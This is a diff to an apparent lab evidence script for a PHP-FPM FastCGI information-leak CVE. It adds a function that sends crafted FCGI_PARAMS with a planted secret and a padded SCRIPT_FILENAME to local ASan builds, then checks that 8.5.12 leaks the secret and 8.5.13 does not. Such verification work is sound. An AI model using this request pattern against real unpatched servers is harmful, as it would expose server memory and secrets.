@@ -60,6 +60,27 @@ def request(port, target, suffix, log):
     return lines
 
 
+def steer(port, target, secret_first, log):
+    """n=20 leak source follows FCGI_PARAMS order: SECRET or a server string."""
+    params = {'REQUEST_METHOD': 'GET', 'REDIRECT_STATUS': '1'}
+    secret = ('SECRET', 'TOPSECRET0123456789')
+    pathinfo = ('PATH_INFO', '/x')
+    for k, v in ((secret, pathinfo) if secret_first else (pathinfo, secret)):
+        params[k] = v
+    params['SCRIPT_FILENAME'] = str(target) + '/' + 'x' * 20
+    cmd = [sys.executable, str(CLIENT), str(port), str(target)]
+    for k, v in params.items():
+        cmd += ['--param', '%s=%s' % (k, v)]
+    cp = subprocess.run(cmd, capture_output=True, timeout=40)
+    body = cp.stdout.decode(errors='replace').split('\r\n\r\n', 1)[-1]
+    lines = [x.strip().split(' ', 1)[-1]
+             for x in body.strip().splitlines() if x.strip()]
+    label = 'SECRET before PATH_INFO' if secret_first else 'SECRET after PATH_INFO'
+    log.write('  %s: PATH_INFO=%s\n' %
+              (label, lines[0] if lines else 'MISSING'))
+    return lines[0] if lines else 'MISSING'
+
+
 def main():
     out = pathlib.Path(sys.argv[1] if len(sys.argv) > 1 else
                        'lab/build/evidence/cve129538-fcgi')
@@ -68,6 +89,7 @@ def main():
     target = tmp / 'target.php'
     target.write_text(TARGET_PHP)
     verdict = {}
+    steered = {}
     try:
         with (out / 'verdict.txt').open('w') as log:
             for i, (tag, binary) in enumerate(BUILDS):
@@ -91,6 +113,11 @@ def main():
                         log.write('  long suffix:\n')
                         fields = request(port, target, '/' + 'x' * 16, log)
                         verdict[tag] = fields[0] if fields else 'MISSING'
+                        if tag in ('8.5.12-asan', '8.5.13-asan'):
+                            steered[tag] = (
+                                steer(port, target, True, log),
+                                steer(port, target, False, log),
+                            )
                     finally:
                         os.killpg(gp.pid, signal.SIGTERM)
                         try:
@@ -108,6 +135,10 @@ def main():
                     verdict['8.5.12-asan'] not in (None, '"/x"'),
                 '8.5.13 clean via FCGI_PARAMS':
                     verdict['8.5.13-asan'] == '"/x"',
+                '8.5.12 leak follows param order':
+                    steered.get('8.5.12-asan') == ('"23456789"', '"27.0.0.1"'),
+                '8.5.13 leak steered away':
+                    steered.get('8.5.13-asan') == ('"/x"', '"/x"'),
             }
             for name, ok in checks.items():
                 log.write('%-40s %s\n' % (name, 'PASS' if ok else 'FAIL'))
